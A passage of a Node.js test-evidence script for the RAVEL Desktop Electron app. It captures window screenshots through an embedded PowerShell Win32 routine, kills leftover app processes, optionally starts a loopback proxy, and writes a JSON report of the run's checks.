  public static extern bool SetForegroundWindow(IntPtr hWnd);
  [DllImport("user32.dll")]
  public static extern bool ShowWindow(IntPtr hWnd, int command);
  [DllImport("user32.dll")]
  public static extern bool SetWindowPos(IntPtr hWnd, IntPtr after, int x, int y, int cx, int cy, uint flags);
  [DllImport("user32.dll")]
  public static extern bool PrintWindow(IntPtr hWnd, IntPtr hdc, uint flags);
}
"@
[void][RavelWin32]::SetProcessDPIAware()
$handle = [IntPtr][Int64]$env:RAVEL_T14_CAPTURE_HANDLE
$path = $env:RAVEL_T14_CAPTURE_PATH
[void][RavelWin32]::ShowWindow($handle, 9)
[void][RavelWin32]::SetWindowPos($handle, [IntPtr](-1), 0, 0, 1100, 760, 0x0040)
[void][RavelWin32]::SetForegroundWindow($handle)
Start-Sleep -Milliseconds 1000
$rect = New-Object RavelWin32+RECT
if (-not [RavelWin32]::GetWindowRect($handle, [ref]$rect)) { throw "GetWindowRect failed" }
$width = $rect.Right - $rect.Left
$height = $rect.Bottom - $rect.Top
if ($width -le 0 -or $height -le 0) { throw "the window has no size" }
$bitmap = New-Object System.Drawing.Bitmap($width, $height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$hdc = $graphics.GetHdc()
$printed = [RavelWin32]::PrintWindow($handle, $hdc, 2)
$graphics.ReleaseHdc($hdc)
if (-not $printed) {
  [void][RavelWin32]::SetForegroundWindow($handle)
  Start-Sleep -Milliseconds 500
  $graphics.CopyFromScreen($rect.Left, $rect.Top, 0, 0, $bitmap.Size)
}
$bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bitmap.Dispose()
`;
  execFileSync("powershell.exe", ["-NoProfile", "-NonInteractive", "-Command", script], {
    env: {
      ...process.env,
      RAVEL_T14_CAPTURE_HANDLE: String(handle),
      RAVEL_T14_CAPTURE_PATH: file,
    },
    stdio: "ignore",
    timeout: 60000,
  });
}

function killPortableByName() {
  try {
    execFileSync(
      "taskkill.exe",
      ["/IM", "RAVEL Desktop.exe", "/T", "/F"],
      { stdio: "ignore", timeout: 30000 },
    );
  } catch {
    // No packaged instance was left running.
  }
}

function spawnSyncTree(pid) {
  if (!pid) return;
  try {
    execFileSync("taskkill.exe", ["/PID", String(pid), "/T", "/F"], {
      stdio: "ignore",
      timeout: 30000,
    });
  } catch {
    // The process may already have exited.
  }
}

async function main() {
  const args = parseArgs(process.argv.slice(2));
  const timestamp = stamp();
  const evidenceDir = path.resolve(
    REPO_ROOT,
    args["evidence-dir"] ??
      path.join("docs", "premium", "evidence", "T14", `windows-electron-${timestamp}`),
  );
  const username = args.username ?? process.env.RAVEL_T14_USERNAME ?? "desktop-owner";
  const password =
    args.password ?? process.env.RAVEL_T14_PASSWORD ?? "desktop-owner-password";

  let proxy = null;
  let gatewayUrl = args["gateway-url"] ?? null;
  const upstreamUrl = args["upstream-url"] ?? process.env.RAVEL_T14_UPSTREAM_URL;
  if (gatewayUrl === null && upstreamUrl !== undefined) {
    proxy = new LoopbackProxy(upstreamUrl);
    await proxy.start();
    gatewayUrl = proxy.url;
  }
  if (gatewayUrl === null) {
    throw new Error("pass --upstream-url (proxy mode) or --gateway-url");
  }

  const options = {
    username,
    password,
    projectTitle: args.project ?? "Catalyst screen",
    evidenceDir,
    gatewayUrl,
    proxy,
    portable: args.portable ?? null,
    skipPackaged: Boolean(args["skip-packaged"]),
  };
  const runner = new Runner(options);
  runner.startedAt = new Date().toISOString();
  fs.mkdirSync(evidenceDir, { recursive: true });

  let failure = null;
  try {
    await runner.run();
  } catch (error) {
    failure = error;
    if (runner.page !== null) {
      try {
        await runner.page.screenshot({
          path: path.join(runner.shotsDir, "failure.png"),
          timeout: 15000,
        });
      } catch {
        // A window that already closed cannot be photographed.
      }
    }
    process.stderr.write(`T14 Electron evidence failed: ${redact(error)}\n`);
  } finally {
    if (runner.app !== null) {
      try {
        await runner.app.close();
      } catch {
        // The application may have crashed; the report records the failure.
      }
    }
    await runner.attacker.stop();
    if (proxy !== null) await proxy.stop();
  }

  const report = await runner.writeReport(failure);
  process.stdout.write(
    JSON.stringify({
      result: report.result,
      evidence_dir: path.relative(REPO_ROOT, evidenceDir).split(path.sep).join("/"),
      checks: Object.keys(report.checks),
      screenshots: report.screenshots.length,
      error: report.error,
    }) + "\n",
  );
  return failure === null ? 0 : 1;
}

main()
  .then((code) => process.exit(code))
  .catch((error) => {
    process.stderr.write(`T14 Electron evidence could not start: ${redact(error)}\n`);
    process.exit(1);
  });
